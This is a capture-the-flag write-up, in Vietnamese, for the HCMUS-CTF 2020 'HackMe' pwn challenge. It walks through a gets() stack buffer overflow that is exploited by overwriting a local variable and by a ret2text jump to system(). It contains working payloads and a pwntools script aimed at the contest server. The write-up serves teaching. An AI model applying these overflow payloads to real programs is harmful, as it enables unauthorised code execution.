# [HCMUS-CTF 2020](https://ctf.hcmus.edu.vn/)

## ⚡ [HackMe](https://ctf.hcmus.edu.vn/challenges#HackMe)

[![df](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)
[![df](https://img.shields.io/badge/member-viplazy-brightgreen.svg)](https://img.shields.io/badge/member-viplazy-brightgreen.svg)
[![df](https://img.shields.io/badge/100-pts-brightgreen.svg)](https://img.shields.io/badge/100-pts-brightgreen.svg)

Tác giả: `pakkunandy`



Tags: `pwn` `bof` | `stack` `variable` | `ret2text`

<!--
### Challenge Description
-->

### Summary

Đây vẫn là challenge về buffer overflow. 

Tham khảo hướng dẫn giải chi tiết về dạng đề này thông qua [SimpleBOF](../SimpleBOF/README.md) challenge.


Đầu tiên, kiểm tra thông tin binary:

```bash
$ checksec hackme
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Chương trình này chạy trên nhân x86, đã tắt hầu hết các bảo vệ.

Mở chương trình với **IDA**, ta kiểm tra hàm **main**:

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _x86_get_pc_thunk_ax();
  setup();
  check_authentication();
  return 0;
}
```
Chỉ duy nhất lời gọi tới hàm **check_authentication** tại đây.

```cpp
int check_authentication()
{
  char s; // [sp+0h] [bp-28h]@1

  puts("============== HCMUS-CTF WELCOME =============");
  puts("[+] Username: ");
  gets(&s);
  if ( !strcmp(&s, "Only-C") )
    check_password();
  return 0;
}
```
Hàm này kiểm tra người dùng nhập vào username, nếu bằng "Only-C" thì tiếp tục kiểm tra mật khẩu qua hàm **check_password**.

```cpp
int check_password()
{
  char s; // [sp+8h] [bp-20h]@1
  int v2; // [sp+1Ch] [bp-Ch]@1

  v2 = -1430532899;
  puts("[+] Password: ");
  gets(&s);
  if ( !strcmp(&s, "LoveM-TP") )
    puts("******** Access Granted ********");
  if ( v2 == -17885688 )
  {
    puts("You got the secret");
    system("/bin/cat flag.txt");
    exit(0);
  }
  return 0;
}
```

Ta thấy flag được in ra ở câu lệnh `system("/bin/cat flag.txt")`, tuy nhiên biểu thức điều kiện ở trước nó lại tự không thỏa mãn, và ta cũng không được phép chỉnh sửa biến `v2`. 




Trên thực tế, ta có thể lợi dụng lỗ hổng của hàm `gets` (không giới hạn số kí tự nhập) khi đọc password để ghi đè lên vùng nhớ của biến v2, hoặc tiếp tục ghi đè lên vùng nhớ của địa chỉ trả về của hàm **check_password** để chuyển địa chỉ lệnh trực tiếp vào trong biểu thức điều kiện để lấy được flag.

Ta sẽ chạy cả 2 cách trên tại đây!

### Exploit #1 Local variable

- Xây dựng payload

    Dựa vào đoạn mã ở trên, ta tính offset từ biến `s` (tại đỉnh stack) đến biến `v2` như sau:
    ```python
    offset = [sp+1Ch] - [sp+8h]  = 0x14 = 20
    ```

    Giá trị mới của **v2** sẽ là -17885688 chuyển qua biểu diễn ở hệ hexa:
    ```python
    >>> hex(-17885688 & (2**32-1))
    '0xfeef1608'
    >>> p32(0xfeef1608)
    b'\x08\x16\xef\xfe'
    ```

    Cấu trúc payload: `payload = Username + NewLine + "A" * offset + v2`

    ```python
    payload = "Only-C\n" + "A"*20 + "\x08\x16\xef\xfe"
    ```

- Local exploit
    
    ```bash
    $ python -c 'print "Only-C\n" + "A"*20 + "\x08\x16\xef\xfe"' | ./hackme
    ============== HCMUS-CTF WELCOME =============
    [+] Username:
    [+] Password:
    You got the secret
    /bin/cat: flag.txt: No such file or directory
    ```

    Thành công, ta chạy trên server và lấy flag thôi!

### Exploit #2 Funtion argument

Chi tiết về phương pháp này sẽ được trình bày ở [ChampionLeague]("../ChampionLeague/README.md") challenge.

- Tìm vị trí địa chỉ trả về của hàm **check_password**
    ```bash
    $ python -c 'print "Only-C\n" + "A"*36 + "BBBB"' | strace ./hackme
    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
    +++ killed by SIGSEGV (core dumped) +++
    Segmentation fault (core dumped)
    ```

    Như vậy, ta cần có **36** bytes offset.




- Lấy địa chỉ gọi câu lệnh system call thông qua `gdb`:

    ```peda
    gdb-peda$ disass check_password
    Dump of assembler code for function check_password:
    ...
    0x080486c2 <+132>:   lea    eax,[ebx-0x17cc]
    0x080486c8 <+138>:   push   eax
    --> 0x080486c9 <+139>:   call   0x8048420 <system@plt>
    0x080486ce <+144>:   add    esp,0x10
    ...
    ```

    Kết quả: **`0x080486c9`**

- Lấy địa chỉ của chuỗi `bin/cat flag.txt`:
    
    ```bash
    $ ROPgadget --binary hackme --string '/bin/cat flag.txt'
    Strings information
    ============================================================
    0x08048834 : /bin/cat flag.txt
    ```
    Ta biết trong binary có chuỗi này vì đã dễ dàng nhìn thấy nó ở **IDA**, và sẽ dùng địa chỉ này như 1 tham số để truyền vào hàm `system`.

    Kết quả: **`0x08048834`**

- Local exploit
    
    Cấu trúc payload: `payload = Username + NewLine + "A" * offset + system_addr + arg1`

    ```python
    payload = "Only-C\n" + "A"*36 + "\xc9\x86\x04\x08" + "\x34\x88\x04\x08"
    ```

    Kết quả:
    
    ```bash
    $ python -c 'print "Only-C\n" + "A"*36 + "\xc9\x86\x04\x08" + \
    > "\x34\x88\x04\x08"' | ./hackme
    ============== HCMUS-CTF WELCOME =============
    [+] Username:
    [+] Password:
    /bin/cat: flag.txt: No such file or directory
    ```

    Thành công, ta chạy trên server và lấy flag thôi!

## Code

```python
#!/usr/bin/env python

from pwn import *

p = remote("159.65.13.76", 63002)
#p = process("./hackme")

print(p.recvuntil("Username:"))

# This for exploit #1
v2 = 0xfeef1608
payload1 = 'Only-C\n' + 'A'*20 + p32(v2)

# This for exploit #2
syscall_addr = 0x080486c9
bincat_addr = 0x08048834

payload2 = 'Only-C\n' + 'A'*36 + p32(syscall_addr) + p32(bincat_addr)


# default payload1
payload = payload1

p.sendline(payload)
p.interactive()
```


📫 Flag: **`HCMUS-CTF{}`**
